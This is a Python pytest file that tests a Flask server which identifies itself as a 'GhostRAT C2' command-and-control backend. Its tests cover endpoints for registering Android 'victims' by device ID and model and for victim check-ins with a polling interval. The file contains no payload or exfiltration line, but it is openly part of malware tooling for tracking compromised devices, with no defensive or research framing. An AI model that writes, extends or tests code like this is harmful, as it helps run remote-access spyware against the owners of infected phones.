import pytest
from app import app

@pytest.fixture
def client():
    app.config['TESTING'] = True
    with app.test_client() as client:
        yield client

def test_home(client):
    """Test home endpoint"""
    response = client.get('/')
    assert response.status_code == 200
    assert response.json['status'] == 'GhostRAT C2 Active'

def test_ping(client):
    """Test ping endpoint"""
    response = client.get('/ping')
    assert response.status_code == 200
    assert response.json['status'] == 'alive'

def test_victim_register(client):
    """Test victim registration"""
    response = client.post('/victim/register', json={
        'device_id': 'test_device',
        'model': 'TestModel',
        'android': '12.0'
    })
    assert response.status_code == 200
    assert 'victim_id' in response.json
    assert 'check_interval' in response.json

def test_victim_checkin(client):
    """Test victim check-in"""
    # First register a victim
    reg_response = client.post('/victim/register', json={
        'device_id': 'test_device',
        'model': 'TestModel',
        'android': '12.0'
    })
    victim_id = reg_response.json['victim_id']
    
    # Then check-in
    response = client.post('/victim/checkin', json={
        'victim_id': victim_id
    })
    assert response.status_code == 200
    assert response.json['status'] == 'ok'
